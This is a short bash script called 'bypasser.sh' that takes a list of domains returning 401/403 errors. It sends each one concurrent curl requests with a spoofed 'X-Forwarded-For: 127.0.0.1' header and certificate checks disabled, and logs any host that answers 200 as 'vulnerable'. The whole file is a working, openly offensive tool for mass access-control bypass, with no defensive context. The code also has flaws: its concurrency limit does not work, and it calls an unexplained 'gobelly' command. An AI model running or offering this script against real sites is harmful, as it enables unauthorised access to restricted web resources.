#!/bin/bash

list=$1
output=$2

echo '''                                                                        
██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗
██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗███████║█████╗  ██████╔╝
██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║██╔══██║██╔══╝  ██╔══██╗
██████╔╝   ██║   ██║     ██║  ██║███████║███████║██║  ██║███████╗██║  ██║
╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                   A tool by INNOCENTx0
''' 

bypass_fingerprint(){
    mkfifo /tmp/pipe_$$
    exec 3<>/tmp/pipe_$$
    rm /tmp/pipe_$$
    for((i=0;i<50;i++)); do echo >&3; done
    
    while read -r DOMAIN;do
        read -u 3 x
        (
            echo  "   [!] SENDIN REQUESTS to $DOMAIN" 
            content=$(curl -X GET "$DOMAIN" -k -I -s --connect-timeout 5 --max-time 10 -L -H "X-Forwarded-For: 127.0.0.1" | grep "^HTTP\/" 2>/dev/null | awk '{print $2}')
	        echo $content            
            if [[ "$content" == "200" ]]; then
                echo "   [!] Vulnerable subdomain found! = $DOMAIN" | gobelly
                echo "Vulnerable host = $DOMAIN" | anew $output
	    else 
		:
	    fi
        ) & echo >&3
    done < $list
    wait
}

if [[ -z "$1" || -z "$2" ]];then
    echo Usage ./bypasser.sh list.txt results.txt

else
    if [ -f $list ];then
        echo "Reading input from $list.. (｡◕‿‿◕｡)"
        bypass_fingerprint
        wait
        echo "If bypassable urls/domain were found, you can find those in $output"
    else
        echo "Missing input file.. make sure to place a file within 401/403 domains inside "
    fi
fi